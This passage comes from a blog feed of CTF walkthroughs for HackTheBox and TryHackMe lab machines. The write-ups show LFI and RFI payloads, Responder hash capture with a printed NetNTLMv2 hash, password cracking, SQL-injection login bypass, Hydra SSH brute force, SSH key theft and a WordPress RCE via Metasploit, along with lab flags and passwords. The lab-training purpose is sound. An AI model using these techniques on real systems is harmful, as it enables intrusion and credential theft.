IP address, what is the domain that we are being redirected to? </p><ul><li><p>unika.htb</p><p>  <img src="/../RESPONDER_IMG/1.png" alt="alt text"></p></li></ul><p> Add to &#x2F;etc&#x2F;hosts the IP with the domain name <code>unika.htb</code> </p><p><img src="/../RESPONDER_IMG/2.png" alt="alt text"></p><p>Which scripting language is being used on the server to generate webpages? </p><ul><li>php</li></ul><p>Using Wappalyzer we see that we have php:</p><p><img src="/../RESPONDER_IMG/3.png" alt="alt text"></p><p>Also on the site if we click on <code>UNIKA</code> we find information disclosure:</p><p><img src="/../RESPONDER_IMG/4.png" alt="alt text"></p><p>And we can find out that the scripting language is php</p><p><img src="/../RESPONDER_IMG/5.png" alt="alt text"></p><p>What is the name of the URL parameter which is used to load different language versions of the webpage? </p><p><img src="/../RESPONDER_IMG/6.png" alt="alt text"></p><p><img src="/../RESPONDER_IMG/7.png" alt="alt text"></p><ul><li>page</li></ul><p> Which of the following values for the <code>page</code> parameter would be an example of exploiting a Local File Include (LFI) vulnerability: “french.html”, “<a href="notion://10.10.14.6/somefile">&#x2F;&#x2F;10.10.14.6&#x2F;somefile</a>“, “..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;hosts”, “minikatz.exe” </p><pre><code class="hljs powershell">http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts</code></pre><p><img src="/../RESPONDER_IMG/8.png" alt="alt text"></p><ul><li>..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;hosts</li></ul><p>Which of the following values for the <code>page</code> parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: “french.html”, “<a href="notion://10.10.14.6/somefile">&#x2F;&#x2F;10.10.14.6&#x2F;somefile</a>“, “..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;hosts”, “minikatz.exe” </p><ul><li><a href="notion://10.10.14.6/somefile">&#x2F;&#x2F;10.10.14.6&#x2F;somefile</a></li></ul><p> What does NTLM stand for? </p><ul><li>New Technology LAN Manager</li></ul><p> Which flag do we use in the Responder utility to specify the network interface? </p><ul><li>-I</li></ul><p> There are several tools that take a NetNTLMv2 challenge&#x2F;response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as <code>john</code>, but the full name is what?. </p><ul><li>John The Ripper</li></ul><p>What is the password for the administrator user?</p><pre><code class="hljs powershell">┌──(kali㉿kali)-[~/<span class="hljs-type">Desktop</span>/<span class="hljs-type">Workspace</span>]└─<span class="hljs-variable">$</span> sudo responder <span class="hljs-literal">-I</span> tun0</code></pre><p>Replace with our tun0 IP</p><p><img src="/../RESPONDER_IMG/9.png" alt="alt text"></p><p><img src="/../RESPONDER_IMG/Screenshot%202024-05-22%20at%2003.22.02.png" alt="alt text"></p><pre><code class="hljs powershell">Administrator::RESPONDER:<span class="hljs-number">9</span>eca27232a041cdd:<span class="hljs-number">41</span>DC346190A23C8CF70B7DE2BF0BE1DE:<span class="hljs-number">0101000000000000807</span>DE42DE6AADA015C38BD87C3D3B8E20000000002000800540034005100480001001E00570049004E002D004E004A005000370031005200590033004D004200310004003400570049004E002D004E004A005000370031005200590033004D00420031002E0054003400510048002E004C004F00430041004C000300140054003400510048002E004C004F00430041004C000500140054003400510048002E004C004F00430041004C0007000800807DE42DE6AADA0106000400020000000800300030000000000000000100000000200000E957A5114AEF28CB30974C534E703AD1C8D2B5D6C6DC9566F345BFB04277EC7F0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200310031000000000000000000</code></pre><p>Add the hash to a file </p><pre><code class="hljs powershell">┌──(kali㉿kali)-[~/<span class="hljs-type">Desktop</span>/<span class="hljs-type">Workspace</span>/<span class="hljs-type">HTB</span>/<span class="hljs-type">starting</span>]└─<span class="hljs-variable">$</span> nano hash.txt</code></pre><p>Found the password:</p><pre><code class="hljs bash">john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</code></pre><p><img src="/../RESPONDER_IMG/Screenshot%202024-05-22%20at%2003.22.10.png" alt="alt text"></p><ul><li>Password : <code>badminton</code></li></ul><p> We’ll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on? </p><ul><li>5985</li></ul><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>Submit root flag</p><p>We’ll use <code>evil-winrm</code></p><pre><code class="hljs powershell">┌──(kali㉿kali)-[~/<span class="hljs-type">Desktop</span>/<span class="hljs-type">Workspace</span>/<span class="hljs-type">HTB</span>/<span class="hljs-type">starting</span>]└─<span class="hljs-variable">$</span> evil<span class="hljs-literal">-winrm</span> <span class="hljs-literal">-u</span> administrator <span class="hljs-literal">-p</span> badminton <span class="hljs-literal">-i</span> unika.htb</code></pre><p><img src="/../RESPONDER_IMG/12.png" alt="alt text"></p><p>Flag <code>ea81b7afddd03efaa0945333ed147fac</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Very Easy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Crocodile</title>
      <link href="/2024/05/16/Crocodile/"/>
      <url>/2024/05/16/Crocodile/</url>
      
        <content type="html"><![CDATA[<p><img src="/../Crocodile_img/00935a242722b9a2c700bdb6b65195f6.webp" alt="alt text"></p><h3 id="NMAP-Scanning"><a href="#NMAP-Scanning" class="headerlink" title="NMAP Scanning :"></a>NMAP Scanning :</h3><pre><code class="hljs powershell">┌──(kali㉿kali)-[~/<span class="hljs-type">Desktop</span>/<span class="hljs-type">Workspace</span>/<span class="hljs-type">HTB</span>/<span class="hljs-type">starting</span>]└─<span class="hljs-variable">$</span> sudo nmap <span class="hljs-literal">-p-</span> <span class="hljs-literal">-sS</span> <span class="hljs-literal">--min-rate</span> <span class="hljs-number">5000</span> <span class="hljs-literal">--open</span> <span class="hljs-literal">-T5</span> <span class="hljs-literal">-vvv</span> <span class="hljs-literal">-Pn</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">1.15</span></code></pre><p><img src="/../Crocodile_img/Screenshot%202024-05-16%20at%2021.52.35.png" alt="alt text"></p><p> What Nmap scanning switch employs the use of default scripts during a scan? </p><ul><li>-sC</li></ul><h3 id="NMAP-Full-Scanning"><a href="#NMAP-Full-Scanning" class="headerlink" title="NMAP Full Scanning :"></a>NMAP Full Scanning :</h3><pre><code class="hljs powershell">┌──(kali㉿kali)-[~/<span class="hljs-type">Desktop</span>/<span class="hljs-type">Workspace</span>/<span class="hljs-type">HTB</span>/<span class="hljs-type">starting</span>]└─<span class="hljs-variable">$</span> nmap <span class="hljs-literal">-A</span> <span class="hljs-literal">-sC</span> <span class="hljs-literal">-sV</span> <span class="hljs-literal">-p21</span>,<span class="hljs-number">80</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">1.15</span> <span class="hljs-literal">-Pn</span></code></pre><p><img src="/../Crocodile_img/Screenshot%202024-05-16%20at%2021.52.53.png" alt="alt text"></p><p>What service version is found to be running on port 21? </p><ul><li>vsftpd 3.0.3</li></ul><p>Log in with ftp anonymous:</p><pre><code class="hljs powershell">┌──(kali㉿kali)-[~/<span class="hljs-type">Desktop</span>/<span class="hljs-type">Workspace</span>/<span class="hljs-type">HTB</span>/<span class="hljs-type">starting</span>]└─<span class="hljs-variable">$</span> ftp <span class="hljs-number">10.129</span>.<span class="hljs-number">1.15</span></code></pre><p><img src="/../Crocodile_img/Screenshot%202024-05-16%20at%2021.53.15.png" alt="alt text"></p><p>What FTP code is returned to us for the “Anonymous FTP login allowed” message? </p><ul><li>230</li></ul><p>After connecting to the FTP server using the ftp client, what username do we provide when prompted to log in anonymously?</p><ul><li>anonymous</li></ul><p>After connecting to the FTP server anonymously, what command can we use to download the files we find on the FTP server? </p><ul><li>get</li></ul><p>What is one of the higher-privilege sounding usernames in ‘allowed.userlist’ that we download from the FTP server? </p><ul><li>admin</li></ul><p><img src="/../Crocodile_img/Screenshot%202024-05-16%20at%2021.53.39.png" alt="alt text"></p><p><img src="/../Crocodile_img/6.png" alt="alt text"></p><p> What version of Apache HTTP Server is running on the target host? </p><ul><li>Apache httpd 2.4.41</li></ul><p>What switch can we use with Gobuster to specify we are looking for specific filetypes? </p><ul><li>-x</li></ul><p>Which PHP file can we identify with directory brute force that will provide the opportunity to authenticate to the web service? </p><ul><li>login.php</li></ul><p><img src="/../dancing_images/Screenshot%202024-05-03%20at%2022.30.15.png" alt="alt text"></p><p>Log in with the credentials we have and get the Flag:</p><p><img src="/../Crocodile_img/Screenshot%202024-05-16%20at%2021.54.18.png" alt="alt text"></p><p><img src="/../Crocodile_img/Screenshot%202024-05-16%20at%2021.54.34.png" alt="alt text"></p><p>Flag : <code>c7110277ac44d78b6a9fff2232434d16</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Very Easy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sequel</title>
      <link href="/2024/05/16/Sequel/"/>
      <url>/2024/05/16/Sequel/</url>
      
        <content type="html"><![CDATA[<p><img src="/../sequel_img/b783687f4acd9b12249440c9a8105e46.webp" alt="alt text"></p><h2 id="Sequel"><a href="#Sequel" class="headerlink" title="Sequel"></a>Sequel</h2><p>IP Address : 10.129.32.164</p><h2 id="NMAP-Scanning"><a href="#NMAP-Scanning" class="headerlink" title="NMAP Scanning :"></a>NMAP Scanning :</h2><pre><code class="hljs powershell">┌──(kali㉿kali)-[~/<span class="hljs-type">Desktop</span>/<span class="hljs-type">Workspace</span>/<span class="hljs-type">HTB</span>/<span class="hljs-type">starting</span>]└─<span class="hljs-variable">$</span> sudo nmap <span class="hljs-literal">-p-</span> <span class="hljs-literal">-sS</span> <span class="hljs-literal">--min-rate</span> <span class="hljs-number">5000</span> <span class="hljs-literal">--open</span> <span class="hljs-literal">-T5</span> <span class="hljs-literal">-vvv</span> <span class="hljs-literal">-Pn</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">32.164</span></code></pre><p><img src="/../sequel_img/Screenshot%202024-05-16%20at%2021.41.05.png" alt="alt text"></p><ul><li>Port 3306 open - mysql</li></ul><p> During our scan, which port do we find serving MySQL? </p><ul><li>3306</li></ul><p> What community-developed MySQL version is the target running? </p><p>Let’s find out </p><p>Use -sC with NMAP </p><pre><code class="hljs powershell">┌──(kali㉿kali)-[~/<span class="hljs-type">Desktop</span>/<span class="hljs-type">Workspace</span>/<span class="hljs-type">HTB</span>/<span class="hljs-type">starting</span>]└─<span class="hljs-variable">$</span> nmap <span class="hljs-literal">-sC</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">32.164</span></code></pre><p><img src="/../sequel_img/Screenshot%202024-05-16%20at%2021.41.23.png" alt="alt text"></p><p>Answer </p><ul><li>MariaDB</li></ul><p>When using the MySQL command line client, what switch do we need to use in order to specify a login username? </p><ul><li>-u</li></ul><p>Which username allows us to log into this MariaDB instance without providing a password? </p><p>After trying some basic usernames we find out the answer is <code>root</code> </p><p><code>mysql -u root -h 10.129.32.164</code></p><p><img src="/../sequel_img/Screenshot%202024-05-16%20at%2021.41.37.png" alt="alt text"></p><p>Answer:</p><ul><li>root</li></ul><p>In SQL, what symbol can we use to specify within the query that we want to display everything inside a table? </p><ul><li><ul><li></li></ul></li></ul><p> In SQL, what symbol do we need to end each query with? </p><ul><li>;</li></ul><p> There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that’s unique to this host? </p><ul><li>htb</li></ul><p><img src="/../sequel_img/Screenshot%202024-05-16%20at%2021.41.47.png" alt="alt text"></p><p> Submit root flag :</p><p><code>use htb;</code> </p><p><img src="/../sequel_img/Screenshot%202024-05-16%20at%2021.41.59.png" alt="alt text"></p><p><img src="/../sequel_img/Screenshot%202024-05-16%20at%2021.42.22.png" alt="alt text"></p><p>FLAG : <code>7b4bec00d1a39e3dd4e021ec3d915da8</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Very Easy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Appointment</title>
      <link href="/2024/05/15/Appointment/"/>
      <url>/2024/05/15/Appointment/</url>
      
        <content type="html"><![CDATA[<p><img src="/../appointment_img/a9ddcda8d2f6eb388c6717de2caff896.webp" alt="alt text"></p><h2 id="Appointment"><a href="#Appointment" class="headerlink" title="Appointment"></a>Appointment</h2><p>Ip Address : 10.129.245.135</p><p> What does the acronym SQL stand for? </p><ul><li>Structured Query Language</li></ul><p> What is one of the most common type of SQL vulnerabilities? </p><ul><li>Sql Injection</li></ul><p> What is the 2021 OWASP Top 10 classification for this vulnerability? </p><ul><li>A03:2021-Injection</li></ul><p>NMAP Scanning : </p><pre><code class="hljs bash">sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.129.245.135</code></pre><p><img src="/../appointment_img/Screenshot%202024-05-15%20at%2016.29.43.png" alt="alt text"></p><p>Port 80 open , that means we should have a web application :</p><p>NMAP Full Scanning:</p><pre><code class="hljs bash">nmap -A -sC -sV -p80 10.129.245.135 -Pn</code></pre><p><img src="/../appointment_img/Screenshot%202024-05-15%20at%2016.29.49.png" alt="alt text"></p><p> What does Nmap report as the service and version that are running on port 80 of the target? </p><ul><li>Apache httpd 2.4.38 ((Debian))</li></ul><p> What is the standard port used for the HTTPS protocol? </p><ul><li>443</li></ul><p> What is a folder called in web-application terminology? </p><ul><li>Directory</li></ul><p> What is the HTTP response code is given for ‘Not Found’ errors? </p><ul><li>404</li></ul><p>Gobuster is one tool used to brute force directories on a webserver. What switch do we use with Gobuster to specify we’re looking to discover directories, and not subdomains? </p><ul><li>dir</li></ul><p> What single character can be used to comment out the rest of a line in MySQL? </p><ul><li><h1 id=""><a href="#" class="headerlink" title=""></a></h1></li></ul><p>If user input is not handled carefully, it could be interpreted as a comment. Use a comment to login as admin without knowing the password. What is the first word on the webpage returned?</p><ul><li>Congratulations</li></ul><p>Intercept the request with BurpSuite</p><p><img src="/../appointment_img/Screenshot%202024-05-15%20at%2016.29.55.png" alt="alt text"></p><p>Send the request to the Repeater</p><p><img src="/../appointment_img/Screenshot%202024-05-15%20at%2016.30.03.png" alt="alt text"></p><p>Add a single quote <code>&#39;</code> and a comment <code>#</code> and url encode it :</p><p><img src="/../appointment_img/Screenshot%202024-05-15%20at%2016.30.12.png" alt="alt text"></p><p>Hit send and get the flag from the Repeater’s response :</p><p><img src="/../appointment_img/Screenshot%202024-05-15%20at%2016.30.21.png" alt="alt text"></p><p>FLAG : <code>e3d0796d002a446c0e622226f42e9672</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Very Easy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dancing</title>
      <link href="/2024/05/05/Dancing/"/>
      <url>/2024/05/05/Dancing/</url>
      
        <content type="html"><![CDATA[<p><img src="/../dancing_images/ce52eadd09ff5a28a1eea8c65d6683a9.png" alt="alt text"></p><h1 id="Dancing"><a href="#Dancing" class="headerlink" title="Dancing"></a>Dancing</h1><p>Machine IP : 10.129.26.54</p><h3 id="NMAP-Scanning"><a href="#NMAP-Scanning" class="headerlink" title="NMAP Scanning:"></a>NMAP Scanning:</h3><pre><code class="hljs bash">sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.129.26.54</code></pre><p><img src="/../dancing_images/Screenshot%202024-05-03%20at%2022.29.34.png" alt="alt text"></p><p>-p135,139,445,5985,47001,49664,49665,49666,49667,49668,49669</p><h3 id="Full-NMAP-Scanning"><a href="#Full-NMAP-Scanning" class="headerlink" title="Full NMAP Scanning:"></a>Full NMAP Scanning:</h3><pre><code class="hljs bash">nmap -A -sC -sV -p135,139,445,5985,47001,49664,49665,49666,49667,49668,49669 10.129.26.54 -Pn</code></pre><p><img src="/../dancing_images/Screenshot%202024-05-03%20at%2022.29.45.png" alt="alt text"></p><h3 id="smbclient"><a href="#smbclient" class="headerlink" title="smbclient"></a>smbclient</h3><pre><code class="hljs bash">smbclient -L \\\\10.129.26.54\\public</code></pre><p><img src="/../dancing_images/Screenshot%202024-05-03%20at%2022.29.55.png" alt="alt text"></p><p>Access <code>WorkShares</code> without a password:</p><pre><code class="hljs bash">smbclient //10.129.26.54/WorkShares -U ANONYMOUS</code></pre><p><img src="/../dancing_images/Screenshot%202024-05-03%20at%2022.30.07.png" alt="alt text"></p><p>Go into James.P</p><p><img src="/../dancing_images/Screenshot%202024-05-03%20at%2022.30.15.png" alt="alt text"></p><p>get flag.txt</p><p><img src="/../dancing_images/Screenshot%202024-05-03%20at%2022.30.24.png" alt="alt text"></p><p><img src="/../dancing_images/Screenshot%202024-05-03%20at%2022.30.32.png" alt="alt text"></p><p>Flag: 5f61c10dffbc77a704d76016a22f1664</p>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Very Easy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redeemer</title>
      <link href="/2024/05/04/Redeemer/"/>
      <url>/2024/05/04/Redeemer/</url>
      
        <content type="html"><![CDATA[<p><img src="/../redeemer_images/cdf77651ab0a4eca65acd5cf388b4c66.webp" alt="alt text"></p><h1 id="Redeemer"><a href="#Redeemer" class="headerlink" title="Redeemer"></a>Redeemer</h1><p>Machine IP: 10.129.29.99</p><p>NMAP Scanning: </p><pre><code class="hljs bash">sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.129.29.99</code></pre><p><img src="/../redeemer_images/Screenshot%202024-05-03%20at%2023.33.04.png" alt="alt text"></p><p>Full NMAP Scanning:</p><pre><code class="hljs bash">nmap -A -sC -sV -p6379 10.129.29.99 -Pn</code></pre><p><img src="/../redeemer_images/Screenshot%202024-05-03%20at%2023.33.13.png" alt="alt text"></p><p>Log in with redis-cli </p><pre><code class="hljs bash">redis-cli -h 10.129.29.99</code></pre><p><img src="/../redeemer_images/Screenshot%202024-05-03%20at%2023.33.20.png" alt="alt text"></p><p>SELECT 0</p><p>KEYS *</p><p><img src="/../redeemer_images/Screenshot%202024-05-03%20at%2023.33.40.png" alt="alt text"></p><p>GET flag :</p><p><img src="/../redeemer_images/Screenshot%202024-05-03%20at%2023.33.48.png" alt="alt text"></p>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Very Easy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fawn</title>
      <link href="/2024/05/03/fawn/"/>
      <url>/2024/05/03/fawn/</url>
      
        <content type="html"><![CDATA[<p><img src="/../fawn_images/b64f85071e626e4cc2272d54332e4131.webp" alt="alt text"></p><h1 id="Fawn"><a href="#Fawn" class="headerlink" title="Fawn"></a>Fawn</h1><p>Machine IP : 10.129.159.51</p><h3 id="NMAP-Scanning"><a href="#NMAP-Scanning" class="headerlink" title="NMAP Scanning :"></a>NMAP Scanning :</h3><pre><code class="hljs bash">sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.129.159.51</code></pre><p><img src="/../fawn_images/Screenshot%202024-05-03%20at%2022.19.19.png" alt="alt text"></p><p>Port 21 (ftp) opened </p><p>Connect to ftp with the username <code>anonymous</code> to log in anonymously :</p><p><img src="/../fawn_images/Screenshot%202024-05-03%20at%2022.21.29.png" alt="alt text"></p><p><code>ls -la</code></p><p><img src="/../fawn_images/Screenshot%202024-05-03%20at%2022.21.43.png" alt="alt text"></p><p><code>get flag.txt</code></p><p><img src="/../fawn_images/Screenshot%202024-05-03%20at%2022.21.50.png" alt="alt text"></p>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Very Easy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Basic Pentesting</title>
      <link href="/2024/04/23/Basic_Pentesting/"/>
      <url>/2024/04/23/Basic_Pentesting/</url>
      
        <content type="html"><![CDATA[<p><img src="/../bpentesting_img/1*MzkWDoTdVyg_NQPs9N_1AQ.png" alt="alt text"></p><p>Room Link: <a href="https://tryhackme.com/r/room/basicpentestingjt">https://tryhackme.com/r/room/basicpentestingjt</a></p><h1 id="Basic-Pentesting"><a href="#Basic-Pentesting" class="headerlink" title="Basic Pentesting"></a>Basic Pentesting</h1><p>NMAP Scanning : (sudo nmap -p- -sS –min-rate 5000 –open -T5 -vvv -Pn 10.10.25.177 | tee nmap&#x2F;10.10.25.177_nmap.txt)</p><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.14.25.png" alt="alt text"></p><pre><code class="hljs bash">PORT     STATE SERVICE      REASON22/tcp   open  ssh          syn-ack ttl 6380/tcp   open  http         syn-ack ttl 63139/tcp  open  netbios-ssn  syn-ack ttl 63445/tcp  open  microsoft-ds syn-ack ttl 638009/tcp open  ajp13        syn-ack ttl 638080/tcp open  http-proxy   syn-ack ttl 63</code></pre><p>Full NMAP Scanning :</p><pre><code class="hljs bash">nmap -A -sC -sV -p22,80,139,445,8009,8080 10.10.25.177 -Pn</code></pre><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.15.54.png" alt="alt text"></p><p>Directory busting :</p><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u [http://10.10.25.177](http://10.10.25.177/) -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</code></pre><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.16.09.png" alt="alt text"></p><p>Found <code>/development</code> </p><p>Let’s check the website and port 8080</p><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.16.20.png" alt="alt text"></p><p>Blank page in maintenance , check for port 8080</p><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.16.27.png" alt="alt text"></p><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.16.36.png" alt="alt text"></p><p>Try random credentials in Manager app </p><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.16.51.png" alt="alt text"></p><p>Hit sign in, nothing happens,  hit cancel and we get this :</p><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.17.03.png" alt="alt text"></p><p>Let’s try another directory busting attack for the 8080 port :</p><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u [http://10.10.25.177:8080](http://10.10.25.177:8080/) -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</code></pre><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.27.05.png" alt="alt text"></p><p>We found nothing..</p><p>Log in anonymous with smb:</p><pre><code class="hljs bash">smbclient \\\\10.10.25.177\\anonymous</code></pre><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.17.48.png" alt="alt text"></p><p>Found a username : <code>Jan</code></p><p>Bruteforcing with Hydra :</p><pre><code class="hljs bash">hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.25.177 ssh</code></pre><p>After about 5 minutes we find the password :</p><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.18.00.png" alt="alt text"></p><p>Password :<code>armando</code> </p><p>Now we succesfully logged in as jan with ssh :</p><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.18.09.png" alt="alt text"></p><p>Now we need to escalate privileges  and get kay’s password, for that we’ll be using linpeas :</p><ul><li><a href="https://linpeas.sh/">https://linpeas.sh/</a></li></ul><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.18.19.png" alt="alt text"></p><p>Copied linpeas to the ssh session and made it executable with <code>chmod +x</code></p><p>Run it </p><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.18.30.png" alt="alt text"></p><p>Found an id_rsa of kay , create a new file with the name <code>kay_id_rsa</code></p><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.18.56.png" alt="alt text"></p><p>As it tells us the password is protected so we’ll use JohnTheRipper to crack it:</p><pre><code class="hljs bash">john kay_id_rsa --wordlist=/usr/share/wordlists/rockyou.txt</code></pre><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.19.04.png" alt="alt text"></p><p>Now we will go back to jan’s ssh session and run this:</p><pre><code class="hljs bash">ssh -i /home/kay/.ssh/id_rsa kay@10.10.25.177</code></pre><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.19.13.png" alt="alt text"></p><p>It asks us to give the passphrase and we have it <code>beeswax</code></p><p>Get the flag :</p><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.19.23.png" alt="alt text"></p><p>Flag : <code>heresareallystrongpasswordthatfollowsthepasswordpolicy$$</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> TryHackMe </tag>
            
            <tag> CTF </tag>
            
            <tag> Easy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Blog</title>
      <link href="/2024/04/22/Blog/"/>
      <url>/2024/04/22/Blog/</url>
      
        <content type="html"><![CDATA[<p><img src="/../blog_images/618f1cc93596ff4082250bce9d869767.png" alt="alt text"></p><p>Room Link: <a href="https://tryhackme.com/r/room/blog">https://tryhackme.com/r/room/blog</a></p><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>Firstly we need to add the IP Address to <code>/etc/hosts</code> </p><p><code>sudo nano /etc/hosts</code></p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.53.23.png" alt="alt text"></p><p>NMAP Scanning :</p><pre><code class="hljs bash">sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.10.155.138</code></pre><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.53.06.png" alt="alt text"></p><p>FULL NMAP Scanning : </p><pre><code class="hljs bash">sudo nmap -A -sC -sV -p80,445,22,139 10.10.155.138 -Pn</code></pre><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.53.15.png" alt="alt text"></p><p>Let’s check smb :</p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.53.44.png" alt="alt text"></p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.53.54.png" alt="alt text"></p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2017.19.50.png" alt="alt text"><br>These seem like some images .jpg non interesting.</p><p>Directory Busting :</p><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u [http://10.10.155.138](http://10.10.155.138/) -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</code></pre><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.54.11.png" alt="alt text"></p><p>Gobuster found some interesting directories, check for <code>/rss</code></p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.54.19.png" alt="alt text"></p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.54.25.png" alt="alt text"></p><p>Seems like a XML File with the site:</p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.54.31.png" alt="alt text"></p><p><code>/atom</code> downloaded us another file </p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.54.40.png" alt="alt text"></p><p>Let’s check out &#x2F;login </p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.54.49.png" alt="alt text"></p><p>Since we have Wordpress we can use WPScan:</p><pre><code class="hljs bash">┌──(kali㉿kali)-[~/…/Workspace/TryHackMe/Boxes/Blog]└─$ wpscan --url http://blog.thm --enumerate ap,dbe,cb,u --detection-mode aggressive</code></pre><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.54.56.png" alt="alt text"></p><p>Found 2 users : </p><ul><li>bjoel          (Billy Joel)</li><li>kwheel      (Karen Wheelerr)</li></ul><p>Performing bruteforce on both users :</p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.55.06.png" alt="alt text"></p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.55.12.png" alt="alt text"></p><p>Found a password for kwheel:</p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.55.19.png" alt="alt text"></p><p>Password : <code>cutiepie1</code> </p><p>Log in with the credentials found :</p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.55.30.png" alt="alt text"></p><p>We know the web application is running wordpress 5.0 which has a known Remote Code Execution vulnerability: </p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.55.37.png" alt="alt text"></p><p><a href="https://www.exploit-db.com/exploits/46662">https://www.exploit-db.com/exploits/46662</a></p><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p><code>msfconsole</code></p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.55.46.png" alt="alt text"></p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.55.55.png" alt="alt text"></p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.56.02.png" alt="alt text"></p><p>Spawning <code>/bin/bash</code> using python:</p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.56.09.png" alt="alt text"></p><p>Finding SUID Binaries :</p><p><code>www-data@blog:/var/www/wordpress$ find / -type f -perm -u=s 2&gt;/dev/null</code></p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.56.16.png" alt="alt text"></p><p>If we try to run that we get that we are not an admin:</p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.56.21.png" alt="alt text"></p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.56.26.png" alt="alt text"></p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.56.32.png" alt="alt text"></p><p>Found first flag 